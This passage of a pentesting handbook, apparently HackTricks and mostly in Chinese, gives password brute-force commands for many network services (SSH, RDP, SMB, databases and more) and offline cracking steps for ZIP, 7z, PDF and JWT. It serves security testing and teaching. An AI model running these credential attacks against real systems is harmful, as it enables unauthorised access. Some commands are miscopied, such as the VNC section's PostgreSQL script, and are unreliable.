./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
```
为了使用**patator**进行**oracle_login**，您需要**安装**以下内容：
```bash
pip3 install cx_Oracle --upgrade
```
[离线OracleSQL哈希暴力破解](../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**版本11.1.0.6、11.1.0.7、11.2.0.1、11.2.0.2**和**11.2.0.3**)：
```bash
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
### POP

POP（Post Office Protocol）是一种用于接收电子邮件的协议。它允许用户从邮件服务器上下载邮件到本地设备。POP协议通常使用TCP端口110进行通信。

#### 暴力破解

暴力破解是一种常见的攻击技术，用于尝试破解密码或访问受保护的系统。它通过尝试所有可能的密码组合来破解密码，直到找到正确的密码为止。暴力破解可能需要很长时间，特别是对于复杂的密码。为了提高成功率，攻击者通常使用字典文件或密码生成算法来生成可能的密码列表。

#### 使用暴力破解攻击POP

使用暴力破解攻击POP服务器是一种常见的方式，用于获取未经授权的访问权限。攻击者可以使用自动化工具，如爆破工具，来尝试不同的用户名和密码组合，直到找到正确的凭据为止。为了防止暴力破解攻击，POP服务器通常会实施安全措施，如限制登录尝试次数、使用复杂密码策略和启用账户锁定功能。
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V
```
### PostgreSQL

PostgreSQL是一种强大的开源关系型数据库管理系统。它具有可扩展性和灵活性，被广泛用于各种应用程序和网站。

#### 暴力破解

暴力破解是一种常见的攻击技术，用于尝试破解密码或访问受保护的系统。对于PostgreSQL数据库，暴力破解可以用于尝试猜测数据库用户的密码。

暴力破解通常涉及使用自动化工具或脚本来尝试大量的可能密码组合。攻击者可以使用常见的密码列表、字典文件或生成的密码来进行尝试。

为了防止暴力破解攻击，PostgreSQL提供了一些安全措施，如密码策略和账户锁定。管理员可以设置密码复杂度要求，并限制登录尝试次数。此外，使用强密码和定期更改密码也是防止暴力破解的重要措施。

作为数据库管理员或开发人员，您应该采取适当的安全措施来保护PostgreSQL数据库免受暴力破解攻击。这包括使用强密码、限制远程访问、定期更新和监控数据库日志等。
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
```
### PPTP

您可以从[https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)下载`.deb`软件包进行安装。
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
### RDP

RDP（远程桌面协议）是一种用于远程访问和控制计算机的协议。它允许用户通过网络连接到远程计算机，并在远程计算机上执行操作，就像直接在本地计算机上一样。

#### 暴力破解

暴力破解是一种常见的攻击技术，用于尝试破解密码或访问受保护的系统。在RDP中，暴力破解可以用于尝试猜测有效的用户名和密码组合，以获取对远程计算机的访问权限。

暴力破解攻击通常使用自动化工具，如字典攻击或暴力破解脚本。这些工具会尝试使用不同的用户名和密码组合进行登录，直到找到有效的凭据为止。

为了防止暴力破解攻击，建议采取以下措施：

- 使用强密码：选择复杂且难以猜测的密码，包括字母、数字和特殊字符的组合。
- 启用账户锁定：在一定的登录尝试失败次数后，自动锁定账户一段时间，以防止攻击者继续尝试登录。
- 使用多因素身份验证：除了用户名和密码，还使用其他身份验证因素，如指纹、令牌或手机验证码。
- 更新和维护系统：及时安装操作系统和应用程序的安全补丁，以修复已知的漏洞。

请注意，暴力破解是一种非法行为，在未经授权的情况下使用此技术可能会导致法律后果。
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
```
### Redis

Redis是一种开源的内存数据结构存储系统，常用于缓存、消息队列和实时分析等应用场景。它支持多种数据结构，如字符串、哈希表、列表、集合和有序集合，并提供了丰富的操作命令。

#### 暴力破解

暴力破解是一种常见的攻击技术，用于尝试破解密码或访问受保护的系统。在Redis中，暴力破解可以用于尝试猜测密码或访问未授权的数据。

##### 基于字典的暴力破解

基于字典的暴力破解是一种常见的暴力破解方法，它通过尝试使用预先准备好的密码列表来猜测密码。攻击者可以使用常见的密码列表、常见的用户名和密码组合，或者自定义的密码列表来进行尝试。

##### 基于暴力破解工具的暴力破解

除了基于字典的暴力破解，还有一些专门设计用于暴力破解的工具，如Hydra和Medusa。这些工具可以自动化暴力破解过程，通过尝试不同的用户名和密码组合来破解密码或访问受保护的系统。

##### 防御措施

为了防止暴力破解攻击，可以采取以下措施：

- 使用强密码：选择一个强密码，包括大小写字母、数字和特殊字符，并定期更改密码。
- 实施账户锁定机制：在一定的尝试次数后，锁定账户一段时间，以防止攻击者继续尝试。
- 使用多因素身份验证：通过使用多个身份验证因素，如密码和手机验证码，提高系统的安全性。
- 监控登录活动：定期检查登录日志，及时发现异常登录行为。
- 更新和维护系统：及时安装补丁和更新，以修复已知的漏洞和安全问题。

暴力破解是一种常见的攻击技术，但通过采取适当的防御措施，可以有效地保护系统免受此类攻击。
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
```
### Rexec

Rexec（Remote Execution）是一种用于在远程计算机上执行命令的协议。它通常用于在网络上执行命令行操作，例如在远程服务器上执行命令或脚本。Rexec协议使用明文传输，因此在使用时需要注意安全性。

Rexec协议的一种常见用途是进行暴力破解攻击。暴力破解是一种通过尝试所有可能的密码组合来破解密码的方法。攻击者可以使用Rexec协议来自动化这个过程，通过不断尝试不同的密码来获取未经授权的访问权限。

为了进行Rexec暴力破解攻击，攻击者通常会使用专门的工具或脚本。这些工具会自动化密码猜测过程，并尝试将每个密码发送到目标服务器上进行验证。攻击者可以使用字典文件或生成的密码列表来进行暴力破解攻击。

然而，Rexec协议的使用存在一些风险。由于明文传输，攻击者可以轻松地截获传输的数据，包括密码和其他敏感信息。因此，在使用Rexec协议时，建议采取额外的安全措施，例如使用加密通信或使用更安全的协议。

总结：Rexec协议是一种用于在远程计算机上执行命令的协议，常用于暴力破解攻击。然而，由于明文传输的风险，使用Rexec协议时需要注意安全性。
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
### Rlogin

Rlogin is a remote login protocol that allows users to log into a remote system over a network. It is commonly used in Unix-based systems for remote administration and file transfer.

#### Brute-Force Attack on Rlogin

A brute-force attack on Rlogin involves systematically trying all possible combinations of usernames and passwords until the correct credentials are found. This method relies on the assumption that the target system has weak or easily guessable credentials.

To perform a brute-force attack on Rlogin, you can use tools like Hydra or Medusa. These tools automate the process of trying different username and password combinations, making the attack more efficient.

It is important to note that brute-force attacks are time-consuming and resource-intensive. They can also be easily detected by intrusion detection systems (IDS) or account lockout mechanisms. Therefore, it is recommended to use other methods, such as password cracking or social engineering, before resorting to brute-force attacks.

#### Mitigation Techniques

To protect against brute-force attacks on Rlogin, you can implement the following mitigation techniques:

1. Use strong and complex passwords: Encourage users to use passwords that are difficult to guess and contain a combination of uppercase and lowercase letters, numbers, and special characters.

2. Implement account lockout policies: Set up account lockout policies that temporarily lock user accounts after a certain number of failed login attempts. This can help prevent brute-force attacks by slowing down the attacker's progress.

3. Enable two-factor authentication (2FA): Implementing 2FA adds an extra layer of security by requiring users to provide a second form of authentication, such as a code sent to their mobile device, in addition to their username and password.

4. Monitor and analyze logs: Regularly monitor and analyze system logs for any suspicious login activity. This can help detect and respond to brute-force attacks in a timely manner.

By implementing these mitigation techniques, you can significantly reduce the risk of successful brute-force attacks on Rlogin.
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
### Rsh

Rsh（Remote Shell）是一种用于远程执行命令的协议。它允许用户在远程计算机上执行命令，就像在本地计算机上一样。Rsh协议通常使用TCP端口514进行通信。

Rsh协议的一个重要特点是它的身份验证机制相对较弱。通常，Rsh服务器会使用基于主机名的身份验证，这意味着只要知道目标主机的名称，就可以尝试连接并执行命令。这使得Rsh协议容易受到暴力破解攻击。

暴力破解是一种通过尝试所有可能的密码组合来破解密码的攻击方法。对于Rsh协议，攻击者可以使用暴力破解工具来尝试连接到目标主机，并使用不同的用户名和密码组合进行身份验证。攻击者可以使用字典文件或生成的密码列表来加快破解速度。

为了防止Rsh协议的暴力破解攻击，建议采取以下措施：

1. 禁用或限制Rsh协议的使用：如果不需要使用Rsh协议，最好禁用或限制其使用，以减少潜在的攻击面。

2. 强化身份验证机制：使用更强大的身份验证机制，如基于公钥的身份验证，可以提高安全性并减少暴力破解的风险。

3. 实施访问控制：限制可以访问Rsh服务的主机和用户，只允许授权的主机和用户连接。

4. 使用强密码：确保使用强密码来保护Rsh服务的账户，避免使用弱密码容易受到暴力破解攻击。

5. 监控和日志记录：定期监控Rsh服务的活动，并记录所有连接尝试和身份验证失败的事件，以便及时检测和应对潜在的攻击。

通过采取这些措施，可以增强Rsh协议的安全性，减少暴力破解攻击的风险。
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

Rsync是一种用于文件同步和传输的工具。它可以在本地系统之间或本地系统与远程系统之间同步文件和目录。Rsync使用快速增量算法，只传输文件的变化部分，从而减少了传输的数据量和时间。这使得Rsync成为备份和镜像文件的理想选择。

Rsync的工作原理是比较源和目标文件的差异，并仅传输差异部分。这种差异传输的方式使得Rsync非常适合在网络带宽有限的情况下进行文件传输。Rsync还支持压缩和加密，以提高传输的效率和安全性。

Rsync可以通过命令行界面或图形界面使用。它提供了许多选项和参数，以满足不同的同步需求。Rsync还支持自动化和定时任务，可以设置定期同步文件和目录。

总结一下，Rsync是一种强大而灵活的文件同步和传输工具，适用于各种场景，包括备份、镜像和远程文件传输。
```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP

RTSP（Real-Time Streaming Protocol）是一种用于实时流媒体传输的协议。它允许客户端通过网络连接到流媒体服务器，并实时接收和播放音频或视频流。RTSP使用TCP或UDP作为传输协议，并使用RTSP命令和响应来控制流媒体的传输和播放。

### 暴力破解

暴力破解是一种常见的密码破解技术，通过尝试所有可能的密码组合来获取未授权访问。这种方法通常用于攻击弱密码保护的系统或服务。暴力破解可以使用字典攻击或穷举攻击的方式进行。

字典攻击是基于预先准备好的密码字典，逐个尝试其中的密码来破解目标系统。穷举攻击则是通过尝试所有可能的密码组合，从而找到正确的密码。这种方法需要耗费大量的时间和计算资源。

为了防止暴力破解，系统管理员应采取一些安全措施，如使用强密码策略、限制登录尝试次数、启用账户锁定功能等。此外，使用多因素身份验证和使用加密算法存储密码也可以提高系统的安全性。
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
### SNMP

SNMP（Simple Network Management Protocol）是一种用于管理和监控网络设备的协议。它允许管理员通过发送请求和接收响应来获取和修改网络设备的信息。SNMP使用基于UDP的传输协议，并使用MIB（Management Information Base）来定义设备的管理信息。攻击者可以利用SNMP协议进行暴力破解攻击，尝试使用不同的凭据来登录设备并获取敏感信息。暴力破解是一种基于尝试和错误的攻击方法，攻击者通过尝试大量的用户名和密码组合来破解目标设备的登录凭据。为了防止SNMP暴力破解攻击，管理员应该采取安全措施，如使用强密码、限制登录尝试次数和启用账户锁定功能。
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
### SMB

SMB（Server Message Block）是一种用于在计算机网络上共享文件、打印机和其他资源的协议。它是一种客户端-服务器协议，允许客户端请求文件或其他服务，并由服务器提供响应。SMB协议通常用于Windows操作系统之间的文件和打印机共享。

### 暴力破解

暴力破解是一种常见的密码破解技术，它通过尝试所有可能的密码组合来获取未授权访问。攻击者使用自动化工具来迭代尝试不同的密码，直到找到正确的密码为止。暴力破解可以用于各种目的，包括获取未授权访问、窃取敏感信息或破解加密数据。

### SMB暴力破解

SMB暴力破解是指使用暴力破解技术来获取SMB协议的未授权访问。攻击者使用自动化工具来尝试不同的用户名和密码组合，直到找到有效的凭据为止。一旦攻击者获得了有效的凭据，他们可以执行各种恶意活动，如访问、修改或删除文件，或者在网络上执行其他攻击。

### 防御措施

为了防止SMB暴力破解攻击，以下是一些推荐的防御措施：

- 使用强密码：确保使用强密码来保护SMB服务的凭据，包括复杂的密码组合和定期更改密码。
- 锁定账户：在一定数量的失败尝试后，锁定账户以防止进一步的暴力破解尝试。
- 使用多因素身份验证：通过使用多因素身份验证来增加访问SMB服务的安全性。
- 监控登录活动：监控SMB登录活动，及时检测和响应异常登录尝试。
- 更新和维护：定期更新和维护SMB服务，以修复已知的漏洞和安全问题。

通过采取这些防御措施，可以提高SMB服务的安全性，并减少暴力破解攻击的风险。
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
```
### SMTP

SMTP（Simple Mail Transfer Protocol）是一种用于电子邮件传输的标准协议。它允许电子邮件客户端发送邮件到邮件服务器，并由服务器将邮件传递给目标收件人的电子邮件服务器。SMTP通常使用TCP端口25进行通信。

#### 暴力破解

暴力破解是一种常见的攻击技术，用于尝试破解密码或访问受保护的系统。在SMTP中，暴力破解可以用于尝试猜测邮件服务器的登录凭据，以获取未经授权的访问权限。

暴力破解攻击通常涉及使用自动化工具，如脚本或软件，通过尝试大量可能的密码组合来猜测正确的密码。攻击者可以使用常见的密码列表、字典文件或生成的密码来进行尝试。

为了防止暴力破解攻击，管理员可以采取以下措施：

- 实施强密码策略，要求用户使用复杂的密码。
- 启用账户锁定功能，限制登录尝试次数。
- 监控登录活动，及时检测异常行为。
- 使用多因素身份验证，提高账户安全性。

尽管暴力破解攻击是一种有效的攻击技术，但它通常需要大量时间和计算资源。因此，使用强密码和其他安全措施可以大大降低暴力破解攻击的成功率。
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
```
### SOCKS

SOCKS（Socket Secure）是一种网络协议，用于在客户端和服务器之间进行代理通信。它允许客户端通过代理服务器与目标服务器进行通信，从而隐藏客户端的真实IP地址。SOCKS协议支持多种版本，包括SOCKS4和SOCKS5。

#### SOCKS4

SOCKS4是SOCKS协议的早期版本，它仅支持IPv4地址。在使用SOCKS4代理时，客户端首先与代理服务器建立连接，然后发送目标服务器的IP地址和端口号。代理服务器将客户端的请求转发给目标服务器，并将目标服务器的响应返回给客户端。

#### SOCKS5

SOCKS5是SOCKS协议的更高级版本，它支持IPv4和IPv6地址，并提供了更多的功能。与SOCKS4不同，SOCKS5在建立连接时需要进行身份验证。客户端可以使用用户名和密码进行身份验证，也可以选择匿名身份验证。一旦身份验证成功，客户端可以通过代理服务器与目标服务器进行通信。

SOCKS5还支持UDP协议的代理转发，这使得客户端可以通过代理服务器进行UDP通信。此外，SOCKS5还支持各种认证方法和插件，以提供更多的灵活性和安全性。

#### 使用SOCKS进行暴力破解

由于SOCKS协议的特性，它可以用于进行暴力破解攻击。攻击者可以使用SOCKS代理服务器来隐藏其真实IP地址，并使用暴力破解工具对目标服务器进行密码猜测。通过使用多个代理服务器和分布式暴力破解工具，攻击者可以增加攻击的效率和隐蔽性。

然而，使用SOCKS进行暴力破解攻击是非法的，并且可能会导致严重的法律后果。只有在合法的渗透测试或授权的安全评估活动中，才能使用暴力破解技术。在进行这些活动时，务必遵守适用的法律和道德准则。
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
```
### SSH

SSH（Secure Shell）是一种加密的网络协议，用于在不安全的网络上安全地进行远程登录和执行命令。SSH使用公钥加密和身份验证机制，确保通信的机密性和完整性。

SSH暴力破解是一种攻击技术，通过尝试所有可能的密码组合来破解SSH登录凭据。这种方法通常是通过自动化工具来实现的，例如使用字典文件或生成密码的算法。

SSH暴力破解可以是一种有效的攻击方法，特别是当目标系统使用弱密码或默认凭据时。为了防止SSH暴力破解，可以采取以下措施：

- 使用强密码：选择足够复杂和难以猜测的密码，包括字母、数字和特殊字符的组合。
- 使用公钥身份验证：使用公钥加密来进行身份验证，而不是依赖密码。
- 配置登录限制：限制登录尝试次数，并设置登录延迟或锁定帐户的策略。
- 使用防火墙：限制SSH访问仅限于受信任的IP地址范围。
- 更新软件：确保SSH服务器和客户端的软件都是最新版本，以修复已知的安全漏洞。

通过采取这些措施，可以增加SSH登录的安全性，减少暴力破解的风险。
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
```
#### 弱SSH密钥 / Debian可预测PRNG

某些系统在生成加密材料时使用的随机种子存在已知缺陷。这可能导致密钥空间大大减少，可以使用诸如[snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute)等工具进行暴力破解。还可以使用预先生成的弱密钥集，例如[g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)。

### SQL Server
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
### Telnet

Telnet是一种用于远程登录和管理计算机系统的网络协议。它允许用户通过网络连接到远程主机，并在远程主机上执行命令。Telnet协议使用明文传输数据，因此不安全，容易受到中间人攻击。黑客可以使用暴力破解技术来尝试猜测和破解Telnet登录凭据。

暴力破解是一种攻击技术，黑客通过尝试所有可能的密码组合来破解登录凭据。黑客可以使用字典攻击或暴力破解工具来自动化这个过程。字典攻击是基于预先准备好的密码列表进行尝试，而暴力破解工具则尝试所有可能的密码组合。

为了保护Telnet登录凭据免受暴力破解攻击，建议采取以下措施：

- 使用强密码：选择包含字母、数字和特殊字符的复杂密码。
- 启用账户锁定：在一定的登录尝试失败次数后，锁定账户一段时间，以防止暴力破解攻击。
- 使用多因素身份验证：通过结合密码和其他身份验证因素，如指纹、令牌或手机验证码，提高登录安全性。
- 禁用Telnet：考虑使用更安全的远程登录协议，如SSH（Secure Shell）来替代Telnet。

通过采取这些措施，可以增强Telnet登录的安全性，减少暴力破解攻击的风险。
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet
```
### VNC

VNC（Virtual Network Computing）是一种远程桌面协议，允许用户通过网络远程控制其他计算机。它使用客户端-服务器模型，其中VNC服务器在远程计算机上运行，而VNC客户端则在本地计算机上运行。通过VNC，用户可以在本地计算机上查看和操作远程计算机的桌面界面。

#### 暴力破解

暴力破解是一种常见的攻击技术，用于破解密码或访问受保护的系统。在VNC的上下文中，暴力破解是指尝试使用各种可能的密码组合来破解VNC服务器的访问密码。攻击者可以使用自动化工具，如暴力破解软件，来尝试大量的密码组合，直到找到正确的密码为止。

#### 防御措施

为了防止VNC服务器受到暴力破解攻击，可以采取以下措施：

1. 使用强密码：选择一个强密码，包含大小写字母、数字和特殊字符，并且长度足够长。
2. 启用账户锁定：在一定的失败尝试次数后，锁定账户一段时间，以防止攻击者继续尝试破解密码。
3. 使用IP过滤：限制可以访问VNC服务器的IP地址范围，只允许信任的IP地址连接。
4. 使用VPN：通过使用虚拟专用网络（VPN），可以在公共网络上建立加密的连接，增加安全性。
5. 更新软件：定期更新VNC服务器软件，以获取最新的安全补丁和修复程序。

通过采取这些防御措施，可以大大减少VNC服务器受到暴力破解攻击的风险。
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm

Winrm（Windows Remote Management）是一种用于远程管理Windows系统的协议。它允许管理员通过网络远程执行命令、获取系统信息和配置设置。Winrm使用HTTP或HTTPS作为传输协议，并支持基于SOAP的消息格式。

#### 暴力破解

暴力破解是一种常见的攻击技术，用于尝试破解密码或访问受保护的系统。在Winrm中，暴力破解可以用于尝试猜测有效的用户名和密码组合，以获取对远程系统的访问权限。

暴力破解通常涉及使用自动化工具，如字典攻击或暴力破解工具，通过尝试大量的可能密码组合来破解系统。这些工具可以使用常见的密码列表、字典文件或生成的密码组合进行尝试。

为了防止暴力破解攻击，管理员应采取以下措施：

- 使用强密码策略，包括密码长度、复杂性和定期更改密码。
- 锁定账户或限制登录尝试次数，以防止攻击者进行大量的尝试。
- 监控登录活动并检测异常行为，如多次失败的登录尝试。
- 使用多因素身份验证来增加登录的安全性。

尽管暴力破解是一种有效的攻击技术，但它通常需要大量的时间和计算资源。因此，使用强密码和其他安全措施可以大大降低系统受到暴力破解攻击的风险。
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)轻松构建和自动化由全球**最先进**的社区工具提供支持的工作流程。
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 本地

### 在线破解数据库

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5和SHA1)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (哈希、WPA2捕获和存档MSOffice、ZIP、PDF...)
* [https://crackstation.net/](https://crackstation.net) (哈希)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (哈希和文件哈希)
* [https://hashes.org/search.php](https://hashes.org/search.php) (哈希)
* [https://www.cmd5.org/](https://www.cmd5.org) (哈希)
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5、NTLM、SHA1、MySQL5、SHA256、SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

在尝试暴力破解哈希之前，请查看这些内容。

### ZIP
```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### 已知明文 zip 攻击

您需要知道加密的 zip 文件中包含的文件的明文（或部分明文）。您可以通过运行以下命令来检查加密的 zip 文件中包含的文件的文件名和文件大小：`7z l encrypted.zip`\
从发布页面下载 [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)。
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```
### 7z

7z是一种开源的压缩文件格式，也是一个用于压缩和解压缩文件的软件。它使用了高度压缩算法，可以在较小的文件大小下存储更多的数据。7z文件通常具有.7z文件扩展名。

#### 暴力破解7z文件

暴力破解是一种破解密码的方法，通过尝试所有可能的组合来找到正确的密码。对于7z文件，我们可以使用暴力破解工具来尝试不同的密码，直到找到正确的密码为止。

以下是一些常用的暴力破解工具：

- **John the Ripper**：这是一个流行的密码破解工具，可以用于暴力破解7z文件。它支持多种密码破解技术，包括字典攻击和暴力破解。

- **Hashcat**：这是另一个功能强大的密码破解工具，可以用于暴力破解7z文件。它支持多种哈希算法和攻击模式，可以高效地破解密码。

- **BruteForcer**：这是一个专门用于暴力破解7z文件的工具。它使用了多线程和优化算法，可以快速地尝试不同的密码组合。

在使用这些工具进行暴力破解时，我们可以使用字典文件来增加破解的效率。字典文件包含了常见的密码和短语，可以帮助我们更快地找到正确的密码。

然而，需要注意的是，暴力破解是一种耗时的过程，尤其是对于复杂的密码。因此，在进行暴力破解之前，我们应该评估破解的时间和资源成本，并确保有合法的授权来进行破解。
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
# 暴力破解

暴力破解是一种常见的密码破解技术，它通过尝试所有可能的密码组合来获取未知密码。这种方法可以用于破解各种类型的密码，包括用户账户密码、加密文件密码等。

暴力破解的过程通常是通过自动化工具来完成的。这些工具会自动尝试不同的密码组合，直到找到正确的密码为止。为了提高破解速度，可以使用多线程或分布式计算来并行处理多个密码尝试。

然而，暴力破解并不是一种高效的破解方法。它需要大量的时间和计算资源，尤其是对于复杂的密码。此外，暴力破解也可能触发安全防护机制，例如账户锁定或IP封锁。

为了提高暴力破解的成功率，可以使用一些技巧和资源。其中一种常见的技巧是使用密码字典。密码字典是一个包含常见密码和常用密码组合的列表。通过使用密码字典，可以减少尝试的密码组合数量，从而提高破解速度。

另一种提高暴力破解成功率的方法是使用规则。规则是一组定义密码生成模式的规则，例如添加特定字符、重复字符或大小写变换等。通过应用这些规则，可以生成更多的密码组合，增加破解的可能性。

除了密码字典和规则，还可以使用一些在线资源来辅助暴力破解。有一些网站提供了密码破解服务，可以帮助破解各种类型的密码。此外，还有一些社区和论坛提供了密码字典和规则的共享，可以帮助提高暴力破解的效果。

总之，暴力破解是一种常见但不高效的密码破解方法。它可以通过使用密码字典、规则和在线资源来提高成功率。然而，由于其耗时和资源消耗较大，建议在合法授权和合规的情况下使用。
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### PDF 所有者密码

要破解 PDF 的所有者密码，请查看此链接：[https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
